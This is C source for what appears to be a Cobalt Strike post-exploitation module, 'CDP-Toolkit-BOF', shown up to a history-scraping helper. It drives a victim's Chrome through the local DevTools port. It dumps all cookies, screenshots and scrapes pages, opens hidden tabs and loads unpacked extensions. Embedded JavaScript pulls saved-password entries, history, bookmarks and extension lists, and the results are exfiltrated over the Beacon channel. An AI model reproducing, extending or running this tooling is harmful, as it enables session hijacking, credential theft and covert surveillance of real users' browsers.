#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdint.h>

#ifdef BOF
#include "beacon.h"
#else
#include <stdio.h>
#include <stdlib.h>
#endif

#define CDPTK_MAX_HTTP (16u * 1024u * 1024u)
#define CDPTK_MAX_WS   (64u * 1024u * 1024u)
#define CDPTK_CHUNK    16384u

#ifdef BOF
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc(HANDLE, DWORD, LPVOID, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpConnect(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR,
                                                            LPCWSTR, LPCWSTR*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSetOption(HINTERNET, DWORD, LPVOID, DWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSendRequest(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD,
                                                       DWORD, DWORD_PTR);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReceiveResponse(HINTERNET, LPVOID);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpQueryDataAvailable(HINTERNET, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReadData(HINTERNET, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpWebSocketCompleteUpgrade(HINTERNET, DWORD_PTR);
DECLSPEC_IMPORT DWORD WINAPI WINHTTP$WinHttpWebSocketSend(HINTERNET,
                                                          WINHTTP_WEB_SOCKET_BUFFER_TYPE,
                                                          PVOID, DWORD);
DECLSPEC_IMPORT DWORD WINAPI WINHTTP$WinHttpWebSocketReceive(HINTERNET, PVOID, DWORD, DWORD*,
                                                             WINHTTP_WEB_SOCKET_BUFFER_TYPE*);
DECLSPEC_IMPORT DWORD WINAPI WINHTTP$WinHttpWebSocketClose(HINTERNET, USHORT, PVOID, DWORD);

DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*,
                                                         DWORD*, DWORD*);
DECLSPEC_IMPORT BOOL BeaconDownload(const char*, const char*, unsigned int);
#else
#define KERNEL32$GetProcessHeap GetProcessHeap
#define KERNEL32$HeapAlloc HeapAlloc
#define KERNEL32$HeapReAlloc HeapReAlloc
#define KERNEL32$HeapFree HeapFree
#define KERNEL32$Sleep Sleep
#define KERNEL32$GetLastError GetLastError
#define WINHTTP$WinHttpOpen WinHttpOpen
#define WINHTTP$WinHttpConnect WinHttpConnect
#define WINHTTP$WinHttpOpenRequest WinHttpOpenRequest
#define WINHTTP$WinHttpSetOption WinHttpSetOption
#define WINHTTP$WinHttpSendRequest WinHttpSendRequest
#define WINHTTP$WinHttpReceiveResponse WinHttpReceiveResponse
#define WINHTTP$WinHttpQueryDataAvailable WinHttpQueryDataAvailable
#define WINHTTP$WinHttpReadData WinHttpReadData
#define WINHTTP$WinHttpCloseHandle WinHttpCloseHandle
#define WINHTTP$WinHttpWebSocketCompleteUpgrade WinHttpWebSocketCompleteUpgrade
#define WINHTTP$WinHttpWebSocketSend WinHttpWebSocketSend
#define WINHTTP$WinHttpWebSocketReceive WinHttpWebSocketReceive
#define WINHTTP$WinHttpWebSocketClose WinHttpWebSocketClose
#define CRYPT32$CryptStringToBinaryA CryptStringToBinaryA
#endif

typedef struct {
  char* data;
  DWORD len;
  DWORD cap;
} BUF;

typedef struct {
  HINTERNET session;
  HINTERNET connect;
  HINTERNET socket;
  int next_id;
  INTERNET_PORT port;
} CDP;

typedef struct {
  char id[128];
  char title[512];
  char url[2048];
  char ws[2048];
} TARGET;

static SIZE_T s_len(const char* s) {
  SIZE_T n = 0;
  if (!s) return 0;
  while (s[n]) n++;
  return n;
}

static int s_eq(const char* a, const char* b) {
  if (!a || !b) return 0;
  while (*a && *a == *b) { a++; b++; }
  return *a == *b;
}

static int s_n_eq(const char* a, const char* b, SIZE_T n) {
  for (SIZE_T i = 0; i < n; i++) if (a[i] != b[i]) return 0;
  return 1;
}

static const char* s_find_range(const char* p, const char* end, const char* needle) {
  SIZE_T n = s_len(needle);
  if (!n) return p;
  while (p + n <= end) {
    if (s_n_eq(p, needle, n)) return p;
    p++;
  }
  return 0;
}

static int s_contains_range(const char* p, const char* end, const char* needle) {
  return s_find_range(p, end, needle) != 0;
}

static void bytes_copy(void* dst, const void* src, SIZE_T n) {
  BYTE* d = (BYTE*)dst;
  const BYTE* s = (const BYTE*)src;
  while (n--) *d++ = *s++;
}

static void bytes_zero(void* dst, SIZE_T n) {
  BYTE* d = (BYTE*)dst;
  while (n--) *d++ = 0;
}

#ifdef BOF
void* memcpy(void* dst, const void* src, size_t n) {
  bytes_copy(dst, src, n);
  return dst;
}

void* memset(void* dst, int value, size_t n) {
  BYTE* d = (BYTE*)dst;
  while (n--) *d++ = (BYTE)value;
  return dst;
}
#endif

static void* h_alloc(SIZE_T n) {
  return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}

static void* h_realloc(void* p, SIZE_T n) {
  if (!p) return h_alloc(n);
  return KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, p, n);
}

static void h_free(void* p) {
  if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p);
}

static int buf_reserve(BUF* b, DWORD extra, DWORD max) {
  if (extra > max || b->len > max - extra) return 0;
  DWORD need = b->len + extra + 1;
  if (need <= b->cap) return 1;
  DWORD cap = b->cap ? b->cap : 4096;
  while (cap < need) {
    if (cap > max / 2) { cap = max + 1; break; }
    cap *= 2;
  }
  if (cap > max + 1) cap = max + 1;
  char* p = (char*)h_realloc(b->data, cap);
  if (!p) return 0;
  b->data = p;
  b->cap = cap;
  return 1;
}

static int buf_append_n(BUF* b, const void* data, DWORD n, DWORD max) {
  if (!buf_reserve(b, n, max)) return 0;
  bytes_copy(b->data + b->len, data, n);
  b->len += n;
  b->data[b->len] = 0;
  return 1;
}

static int buf_append(BUF* b, const char* s, DWORD max) {
  return buf_append_n(b, s, (DWORD)s_len(s), max);
}

static int buf_append_uint(BUF* b, unsigned int value, DWORD max) {
  char tmp[16];
  int i = 15;
  tmp[i] = 0;
  do { tmp[--i] = (char)('0' + (value % 10)); value /= 10; } while (value && i);
  return buf_append(b, tmp + i, max);
}

static int buf_append_json_string(BUF* b, const char* s, DWORD max) {
  if (!buf_append_n(b, "\"", 1, max)) return 0;
  while (s && *s) {
    unsigned char c = (unsigned char)*s++;
    if (c == '"' || c == '\\') {
      char q[2] = {'\\', (char)c};
      if (!buf_append_n(b, q, 2, max)) return 0;
    } else if (c == '\n') {
      if (!buf_append(b, "\\n", max)) return 0;
    } else if (c == '\r') {
      if (!buf_append(b, "\\r", max)) return 0;
    } else if (c == '\t') {
      if (!buf_append(b, "\\t", max)) return 0;
    } else if (c >= 0x20) {
      if (!buf_append_n(b, &c, 1, max)) return 0;
    }
  }
  return buf_append_n(b, "\"", 1, max);
}

static void buf_free(BUF* b) {
  if (b) { h_free(b->data); bytes_zero(b, sizeof(*b)); }
}

static void out_text(const char* text) {
  if (!text) return;
#ifdef BOF
  BeaconOutput(CALLBACK_OUTPUT_UTF8, (char*)text, (int)s_len(text));
#else
  printf("%s\n", text);
#endif
}

static void out_error(const char* text) {
#ifdef BOF
  BeaconPrintf(CALLBACK_ERROR, "[-] %s", text ? text : "error");
#else
  fprintf(stderr, "[-] %s\n", text ? text : "error");
#endif
}

static void out_status(const char* text) {
#ifdef BOF
  BeaconPrintf(CALLBACK_OUTPUT, "[*] %s", text ? text : "");
#else
  printf("[*] %s\n", text ? text : "");
#endif
}

static int out_artifact(const char* name, const BYTE* data, DWORD len) {
#ifdef BOF
  if (!BeaconDownload(name, (const char*)data, len)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] BeaconDownload failed for %s", name);
    return 0;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] Downloaded %s (%lu bytes)", name, len);
  return 1;
#else
  FILE* f = fopen(name, "wb");
  if (!f) return 0;
  size_t written = fwrite(data, 1, len, f);
  fclose(f);
  printf("[+] Wrote %s (%lu bytes)\n", name, (unsigned long)written);
  return written == len;
#endif
}

static int json_get_string_range(const char* begin, const char* end, const char* key,
                                 char* out, DWORD cap) {
  BUF pat = {0};
  int ok = 0;
  if (!buf_append_n(&pat, "\"", 1, 512) || !buf_append(&pat, key, 512) ||
      !buf_append_n(&pat, "\"", 1, 512)) goto done;
  const char* p = s_find_range(begin, end, pat.data);
  if (!p) goto done;
  p += pat.len;
  while (p < end && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')) p++;
  if (p >= end || *p++ != ':') goto done;
  while (p < end && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')) p++;
  if (p >= end || *p++ != '"') goto done;
  DWORD n = 0;
  while (p < end && *p != '"') {
    char c = *p++;
    if (c == '\\' && p < end) {
      char e = *p++;
      if (e == 'n') c = '\n';
      else if (e == 'r') c = '\r';
      else if (e == 't') c = '\t';
      else if (e == 'b') c = '\b';
      else if (e == 'f') c = '\f';
      else if (e == 'u') {
        if (p + 4 <= end) p += 4;
        c = '?';
      } else c = e;
    }
    if (n + 1 < cap) out[n++] = c;
  }
  if (p >= end || *p != '"' || !cap) goto done;
  out[n] = 0;
  ok = 1;
done:
  buf_free(&pat);
  return ok;
}

static int json_get_string(const char* json, const char* key, char* out, DWORD cap) {
  return json_get_string_range(json, json + s_len(json), key, out, cap);
}

static int json_get_int(const char* json, const char* key, int* value) {
  BUF pat = {0};
  if (!buf_append_n(&pat, "\"", 1, 512) || !buf_append(&pat, key, 512) ||
      !buf_append_n(&pat, "\"", 1, 512)) { buf_free(&pat); return 0; }
  const char* end = json + s_len(json);
  const char* p = s_find_range(json, end, pat.data);
  buf_free(&pat);
  if (!p) return 0;
  p += s_len(key) + 2;
  while (p < end && *p != ':') p++;
  if (p == end) return 0;
  p++;
  while (p < end && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')) p++;
  int sign = 1, v = 0, digits = 0;
  if (p < end && *p == '-') { sign = -1; p++; }
  while (p < end && *p >= '0' && *p <= '9') { v = v * 10 + (*p++ - '0'); digits++; }
  if (!digits) return 0;
  *value = v * sign;
  return 1;
}

static int digits_only(const char* s) {
  if (!s || !*s) return 0;
  while (*s) { if (*s < '0' || *s > '9') return 0; s++; }
  return 1;
}

static int to_int(const char* s) {
  int n = 0;
  while (s && *s >= '0' && *s <= '9') n = n * 10 + (*s++ - '0');
  return n;
}

static int target_match(const TARGET* t, const char* selector, int page_index) {
  if (!selector || !*selector) return page_index == 1;
  if (digits_only(selector)) return page_index == to_int(selector);
  SIZE_T n = s_len(selector);
  if (n && s_n_eq(t->id, selector, n)) return 1;
  return s_contains_range(t->title, t->title + s_len(t->title), selector) ||
         s_contains_range(t->url, t->url + s_len(t->url), selector);
}

static int select_target(const char* list, const char* selector, TARGET* out) {
  const char* p = list;
  const char* end = list + s_len(list);
  int depth = 0, in_string = 0, escape = 0, page_index = 0;
  const char* object = 0;
  while (p < end) {
    char c = *p;
    if (in_string) {
      if (escape) escape = 0;
      else if (c == '\\') escape = 1;
      else if (c == '"') in_string = 0;
    } else {
      if (c == '"') in_string = 1;
      else if (c == '{') { if (depth == 0) object = p; depth++; }
      else if (c == '}') {
        depth--;
        if (depth == 0 && object) {
          char type[64] = {0};
          TARGET t;
          bytes_zero(&t, sizeof(t));
          json_get_string_range(object, p + 1, "id", t.id, sizeof(t.id));
          if (!t.id[0]) json_get_string_range(object, p + 1, "targetId", t.id, sizeof(t.id));
          json_get_string_range(object, p + 1, "title", t.title, sizeof(t.title));
          json_get_string_range(object, p + 1, "url", t.url, sizeof(t.url));
          json_get_string_range(object, p + 1, "webSocketDebuggerUrl", t.ws, sizeof(t.ws));
          if (json_get_string_range(object, p + 1, "type", type, sizeof(type)) && s_eq(type, "page")) {
            page_index++;
            if (target_match(&t, selector, page_index)) { *out = t; return 1; }
          } else if (selector && *selector && !digits_only(selector)) {
            SIZE_T selector_len = s_len(selector);
            if (selector_len && s_n_eq(t.id, selector, selector_len)) { *out = t; return 1; }
          }
          object = 0;
        }
      }
    }
    p++;
  }
  return 0;
}

static int ws_path_from_url(const char* url, char* path, DWORD cap) {
  const char* p = s_find_range(url, url + s_len(url), "://");
  if (!p) return 0;
  p += 3;
  while (*p && *p != '/') p++;
  if (!*p || s_len(p) + 1 > cap) return 0;
  bytes_copy(path, p, s_len(p) + 1);
  return 1;
}

static HINTERNET http_open_session(void) {
  return WINHTTP$WinHttpOpen(L"CDP-Toolkit-BOF/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
}

static int http_request(INTERNET_PORT port, const wchar_t* verb, const wchar_t* path, BUF* out) {
  int ok = 0;
  HINTERNET session = http_open_session(), connect = 0, request = 0;
  if (!session) goto done;
  connect = WINHTTP$WinHttpConnect(session, L"127.0.0.1", port, 0);
  if (!connect) goto done;
  request = WINHTTP$WinHttpOpenRequest(connect, verb, path, 0, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if (!request) goto done;
  if (!WINHTTP$WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
      !WINHTTP$WinHttpReceiveResponse(request, 0)) goto done;
  for (;;) {
    DWORD available = 0, read = 0;
    if (!WINHTTP$WinHttpQueryDataAvailable(request, &available)) goto done;
    if (!available) { ok = 1; break; }
    if (!buf_reserve(out, available, CDPTK_MAX_HTTP)) goto done;
    if (!WINHTTP$WinHttpReadData(request, out->data + out->len, available, &read)) goto done;
    out->len += read;
    out->data[out->len] = 0;
  }
done:
  if (request) WINHTTP$WinHttpCloseHandle(request);
  if (connect) WINHTTP$WinHttpCloseHandle(connect);
  if (session) WINHTTP$WinHttpCloseHandle(session);
  return ok;
}

static int get_path(INTERNET_PORT port, const char* path_a, BUF* out) {
  wchar_t path[4096];
  SIZE_T n = s_len(path_a);
  if (n + 1 > sizeof(path) / sizeof(path[0])) return 0;
  for (SIZE_T i = 0; i <= n; i++) path[i] = (wchar_t)(unsigned char)path_a[i];
  return http_request(port, L"GET", path, out);
}

static int cdp_open(CDP* c, INTERNET_PORT port, const char* ws_url) {
  char path_a[2048];
  wchar_t path[2048];
  if (!ws_path_from_url(ws_url, path_a, sizeof(path_a))) return 0;
  SIZE_T n = s_len(path_a);
  for (SIZE_T i = 0; i <= n; i++) path[i] = (wchar_t)(unsigned char)path_a[i];
  bytes_zero(c, sizeof(*c));
  c->port = port;
  c->session = http_open_session();
  if (!c->session) return 0;
  c->connect = WINHTTP$WinHttpConnect(c->session, L"127.0.0.1", port, 0);
  if (!c->connect) return 0;
  HINTERNET request = WINHTTP$WinHttpOpenRequest(c->connect, L"GET", path, 0,
                                                 WINHTTP_NO_REFERER,
                                                 WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if (!request) return 0;
  int ok = WINHTTP$WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, 0, 0) &&
           WINHTTP$WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
           WINHTTP$WinHttpReceiveResponse(request, 0);
  if (ok) c->socket = WINHTTP$WinHttpWebSocketCompleteUpgrade(request, 0);
  WINHTTP$WinHttpCloseHandle(request);
  if (!c->socket) {
    if (c->connect) WINHTTP$WinHttpCloseHandle(c->connect);
    if (c->session) WINHTTP$WinHttpCloseHandle(c->session);
    bytes_zero(c, sizeof(*c));
  }
  return c->socket != 0;
}

static int cdp_open_browser(CDP* c, INTERNET_PORT port, BUF* version) {
  if (!get_path(port, "/json/version", version)) return 0;
  char ws[2048];
  if (!json_get_string(version->data, "webSocketDebuggerUrl", ws, sizeof(ws))) return 0;
  return cdp_open(c, port, ws);
}

static void cdp_close(CDP* c) {
  if (!c) return;
  if (c->socket) {
    WINHTTP$WinHttpWebSocketClose(c->socket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, 0, 0);
    WINHTTP$WinHttpCloseHandle(c->socket);
  }
  if (c->connect) WINHTTP$WinHttpCloseHandle(c->connect);
  if (c->session) WINHTTP$WinHttpCloseHandle(c->session);
  bytes_zero(c, sizeof(*c));
}

static int ws_receive_message(CDP* c, BUF* out) {
  BYTE chunk[CDPTK_CHUNK];
  for (;;) {
    DWORD read = 0;
    WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
    DWORD err = WINHTTP$WinHttpWebSocketReceive(c->socket, chunk, sizeof(chunk), &read, &type);
    if (err != NO_ERROR || type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) return 0;
    if (!buf_append_n(out, chunk, read, CDPTK_MAX_WS)) return 0;
    if (type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE ||
        type == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE) return 1;
  }
}

static int cdp_send(CDP* c, const char* method, const char* params, const char* session_id,
                    BUF* response) {
  BUF req = {0};
  int id = ++c->next_id;
  int ok = buf_append(&req, "{\"id\":", CDPTK_MAX_HTTP) &&
           buf_append_uint(&req, (unsigned int)id, CDPTK_MAX_HTTP) &&
           buf_append(&req, ",\"method\":", CDPTK_MAX_HTTP) &&
           buf_append_json_string(&req, method, CDPTK_MAX_HTTP) &&
           buf_append(&req, ",\"params\":", CDPTK_MAX_HTTP) &&
           buf_append(&req, params ? params : "{}", CDPTK_MAX_HTTP);
  if (ok && session_id && *session_id)
    ok = buf_append(&req, ",\"sessionId\":", CDPTK_MAX_HTTP) &&
         buf_append_json_string(&req, session_id, CDPTK_MAX_HTTP);
  if (ok) ok = buf_append(&req, "}", CDPTK_MAX_HTTP);
  if (!ok) { buf_free(&req); return 0; }
  DWORD err = WINHTTP$WinHttpWebSocketSend(c->socket, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                                           req.data, req.len);
  buf_free(&req);
  if (err != NO_ERROR) return 0;
  for (int i = 0; i < 200; i++) {
    BUF msg = {0};
    if (!ws_receive_message(c, &msg)) { buf_free(&msg); return 0; }
    int got = -1;
    if (json_get_int(msg.data, "id", &got) && got == id) {
      *response = msg;
      return 1;
    }
    buf_free(&msg);
  }
  return 0;
}

static int cdp_error(const BUF* response) {
  return response && response->data &&
         s_contains_range(response->data, response->data + response->len, "\"error\"");
}

static int make_one_string_params(BUF* p, const char* key, const char* value) {
  return buf_append(p, "{", CDPTK_MAX_HTTP) && buf_append_json_string(p, key, CDPTK_MAX_HTTP) &&
         buf_append(p, ":", CDPTK_MAX_HTTP) && buf_append_json_string(p, value, CDPTK_MAX_HTTP) &&
         buf_append(p, "}", CDPTK_MAX_HTTP);
}

static int get_target_list(INTERNET_PORT port, BUF* list) {
  return get_path(port, "/json/list", list);
}

static int resolve_target(INTERNET_PORT port, const char* selector, TARGET* target) {
  BUF list = {0};
  int ok = get_target_list(port, &list) && select_target(list.data, selector, target);
  buf_free(&list);
  return ok;
}

static int operation_discover(INTERNET_PORT port) {
  BUF version = {0}, list = {0};
  int ok = get_path(port, "/json/version", &version) && get_target_list(port, &list);
  if (ok) {
    out_status("/json/version"); out_text(version.data);
    out_status("/json/list"); out_text(list.data);
  } else out_error("CDP discovery failed");
  buf_free(&version); buf_free(&list);
  return ok;
}

static int operation_tabs(INTERNET_PORT port) {
  BUF list = {0};
  int ok = get_target_list(port, &list);
  if (ok) out_text(list.data); else out_error("target listing failed");
  buf_free(&list);
  return ok;
}

static int operation_screenshot(INTERNET_PORT port, const char* selector, int full) {
  TARGET target;
  bytes_zero(&target, sizeof(target));
  if (!resolve_target(port, selector, &target) || !target.ws[0]) {
    out_error("screenshot target not found"); return 0;
  }
  CDP c; BUF response = {0};
  if (!cdp_open(&c, port, target.ws)) { out_error("target WebSocket connection failed"); return 0; }
  const char* params = full ? "{\"format\":\"png\",\"captureBeyondViewport\":true}" :
                              "{\"format\":\"png\"}";
  int ok = cdp_send(&c, "Page.captureScreenshot", params, 0, &response) && !cdp_error(&response);
  if (!ok) { if (response.data) out_text(response.data); else out_error("screenshot command failed"); goto done; }
  char* encoded = (char*)h_alloc(response.len + 1);
  if (!encoded || !json_get_string(response.data, "data", encoded, response.len + 1)) {
    out_error("screenshot response had no data"); ok = 0; h_free(encoded); goto done;
  }
  DWORD decoded_len = 0;
  if (!CRYPT32$CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, 0, &decoded_len, 0, 0)) {
    out_error("base64 size query failed"); ok = 0; h_free(encoded); goto done;
  }
  BYTE* decoded = (BYTE*)h_alloc(decoded_len);
  if (!decoded || !CRYPT32$CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, decoded,
                                                 &decoded_len, 0, 0)) {
    out_error("base64 decode failed"); ok = 0;
  } else ok = out_artifact("cdptk-screenshot.png", decoded, decoded_len);
  h_free(decoded); h_free(encoded);
done:
  buf_free(&response); cdp_close(&c); return ok;
}

static int with_browser_command(INTERNET_PORT port, const char* method, const char* params,
                                const char* session_id, BUF* response) {
  CDP c; BUF version = {0};
  int ok = cdp_open_browser(&c, port, &version);
  if (!ok) { out_error("browser WebSocket connection failed"); buf_free(&version); return 0; }
  ok = cdp_send(&c, method, params, session_id, response);
  cdp_close(&c); buf_free(&version);
  return ok;
}

static int operation_simple_browser(INTERNET_PORT port, const char* method, const char* params) {
  BUF response = {0};
  int ok = with_browser_command(port, method, params, 0, &response) && !cdp_error(&response);
  if (response.data) out_text(response.data); else out_error("CDP command failed");
  buf_free(&response); return ok;
}

static int operation_page_new(INTERNET_PORT port, const char* url, const char* mode) {
  CDP c; BUF version = {0}, context = {0}, params = {0}, response = {0};
  bytes_zero(&c, sizeof(c));
  char context_id[128] = {0};
  int ok = cdp_open_browser(&c, port, &version);
  if (!ok) { out_error("browser WebSocket connection failed"); goto done; }
  if (mode && s_eq(mode, "isolated")) {
    ok = cdp_send(&c, "Target.createBrowserContext", "{\"disposeOnDetach\":false}", 0, &context) &&
         !cdp_error(&context) && json_get_string(context.data, "browserContextId", context_id, sizeof(context_id));
    if (!ok) { out_error("isolated context creation failed"); goto done; }
    out_text(context.data);
  }
  ok = buf_append(&params, "{\"url\":", CDPTK_MAX_HTTP) &&
       buf_append_json_string(&params, url && *url ? url : "about:blank", CDPTK_MAX_HTTP);
  if (ok && context_id[0])
    ok = buf_append(&params, ",\"browserContextId\":", CDPTK_MAX_HTTP) &&
         buf_append_json_string(&params, context_id, CDPTK_MAX_HTTP);
  if (ok && mode && s_eq(mode, "hidden"))
    ok = buf_append(&params, ",\"hidden\":true,\"background\":true", CDPTK_MAX_HTTP);
  else if (ok && mode && s_eq(mode, "background"))
    ok = buf_append(&params, ",\"background\":true", CDPTK_MAX_HTTP);
  if (ok) ok = buf_append(&params, "}", CDPTK_MAX_HTTP) &&
               cdp_send(&c, "Target.createTarget", params.data, 0, &response) &&
               !cdp_error(&response);
  if (response.data) out_text(response.data); else if (!ok) out_error("target creation failed");
done:
  buf_free(&response); buf_free(&params); buf_free(&context); buf_free(&version); cdp_close(&c);
  return ok;
}

static int operation_page_close(INTERNET_PORT port, const char* selector) {
  TARGET t; bytes_zero(&t, sizeof(t));
  if (!resolve_target(port, selector, &t)) { out_error("target not found"); return 0; }
  BUF params = {0};
  int ok = make_one_string_params(&params, "targetId", t.id) &&
           operation_simple_browser(port, "Target.closeTarget", params.data);
  buf_free(&params); return ok;
}

static int operation_context_dispose(INTERNET_PORT port, const char* id) {
  BUF params = {0};
  int ok = make_one_string_params(&params, "browserContextId", id) &&
           operation_simple_browser(port, "Target.disposeBrowserContext", params.data);
  buf_free(&params); return ok;
}

static int operation_cookies(INTERNET_PORT port) {
  return operation_simple_browser(port, "Storage.getCookies", "{}");
}

static int operation_snapshot(INTERNET_PORT port, const char* selector, const char* kind) {
  TARGET target; bytes_zero(&target, sizeof(target));
  if (!resolve_target(port, selector, &target) || !target.ws[0]) {
    out_error("snapshot target not found"); return 0;
  }
  CDP c; BUF response = {0};
  if (!cdp_open(&c, port, target.ws)) { out_error("target WebSocket connection failed"); return 0; }
  int ok;
  if (kind && s_eq(kind, "dom"))
    ok = cdp_send(&c, "DOMSnapshot.captureSnapshot", "{\"computedStyles\":[]}", 0, &response);
  else
    ok = cdp_send(&c, "Accessibility.getFullAXTree", "{}", 0, &response);
  if (!ok || cdp_error(&response)) {
    if (response.data) out_text(response.data); else out_error("snapshot command failed");
    ok = 0;
  } else ok = out_artifact("cdptk-snapshot.json", (BYTE*)response.data, response.len);
  buf_free(&response); cdp_close(&c); return ok;
}

static int operation_extensions_load(INTERNET_PORT port, const char* path, int incognito) {
  CDP c; BUF version = {0}, attach = {0}, response = {0}, params = {0};
  bytes_zero(&c, sizeof(c));
  char session_id[128] = {0};
  int ok = cdp_open_browser(&c, port, &version) &&
           cdp_send(&c, "Target.attachToBrowserTarget", "{}", 0, &attach) &&
           !cdp_error(&attach) && json_get_string(attach.data, "sessionId", session_id, sizeof(session_id));
  if (!ok) { out_error("browser target attach failed"); goto done; }
  ok = buf_append(&params, "{\"path\":", CDPTK_MAX_HTTP) &&
       buf_append_json_string(&params, path, CDPTK_MAX_HTTP) &&
       buf_append(&params, incognito ? ",\"enableInIncognito\":true}" :
                                      ",\"enableInIncognito\":false}", CDPTK_MAX_HTTP) &&
       cdp_send(&c, "Extensions.loadUnpacked", params.data, session_id, &response) &&
       !cdp_error(&response);
  if (response.data) out_text(response.data); else if (!ok) out_error("extension load failed");
done:
  buf_free(&params); buf_free(&response); buf_free(&attach); buf_free(&version); cdp_close(&c);
  return ok;
}

static const char* JS_DEEP_SCRAPE =
"(()=>{const seen=new Set(),roots=[document],lines=[],items=[],ls=new Set();"
"const clean=v=>String(v||'').replace(/\\u00a0/g,' ').replace(/[ \\t\\r\\f\\v]+/g,' ').trim();"
"const push=v=>{for(const r of String(v||'').split(/\\n+/)){const x=clean(r);if(x&&!ls.has(x)&&lines.length<300){ls.add(x);lines.push(x)}}};"
"function visit(n){if(!n||seen.has(n))return;seen.add(n);if(n.nodeType===Node.ELEMENT_NODE){const e=n;"
"const a=clean(e.getAttribute&&e.getAttribute('aria-label')),ti=clean(e.getAttribute&&e.getAttribute('title')),"
"ro=clean(e.getAttribute&&e.getAttribute('role')),id=clean(e.id||''),tag=clean(e.tagName||'').toLowerCase(),"
"h=clean(e.href||(e.getAttribute&&e.getAttribute('href')));if((a||ti||h)&&items.length<200)items.push({tag,aria:a,title:ti,role:ro,id,href:h});"
"if(e.shadowRoot){roots.push(e.shadowRoot);visit(e.shadowRoot)}}for(const c of(n.children?Array.from(n.children):[]))visit(c)}"
"visit(document);for(const r of roots)push(r.body?.innerText||r.host?.innerText||'');"
"return{url:location.href,title:document.title,readyState:document.readyState,lines,items}})()";

static const char* JS_BOOKMARKS =
"(()=>typeof chrome!=='undefined'&&chrome.bookmarks&&chrome.bookmarks.getTree?chrome.bookmarks.getTree():undefined)()";
static const char* JS_PASSWORDS =
"(()=>{const s=document.querySelector('password-manager-app')?.shadowRoot?.querySelector('passwords-section');"
"const g=s?.__data?.groups_;if(!g)return undefined;return g.map(x=>({site:x.name||'',icon_url:x.iconUrl||'',"
"entry_count:(x.entries||[]).length,entries:(x.entries||[]).map(e=>({username:e.username||'',id:e.id,hidden:!!e.hidden,"
"stored_in:e.storedIn||'',is_passkey:!!e.isPasskey,affiliated_domains:(e.affiliatedDomains||[]).map(d=>({name:d.name||'',signon_realm:d.signonRealm||'',url:d.url||''}))}))}))})()";
static const char* JS_EXTENSIONS =
"(()=>{const m=document.querySelector('extensions-manager'),a=m?.extensions_;if(!a)return undefined;return a.map(e=>({"
"id:e.id||'',name:e.name||'',version:e.version||'',description:e.description||'',state:e.state||'',type:e.type||'',"
"location:e.location||'',options_url:e.optionsPage?.url||'',permissions:(e.permissions?.simplePermissions||[]).map(p=>p.message||''),"
"views:(e.views||[]).map(v=>({type:v.type||'',url:v.url||'',incognito:!!v.incognito}))}))})()";

static int build_history_js(BUF* js, const char* query) {
  return buf_append(js, "(()=>{const q=", CDPTK_MAX_HTTP) &&
         buf_append_json_string(js, query ? query : "", CDPTK_MAX_HTTP) &&
         buf_append(js, ".toLowerCase();const l=document.querySelector('history-app')?.shadowRoot?.querySelector('history-list');"
                        "const a=l?.historyData_;if(!a)return undefined;return a.filter(x=>!q||String(x.title||x.pageTitle||'').toLowerCase().includes(q)||String(x.url||'').toLowerCase().includes(q)).slice(0,100)})()",
                    CDPTK_MAX_HTTP);
}

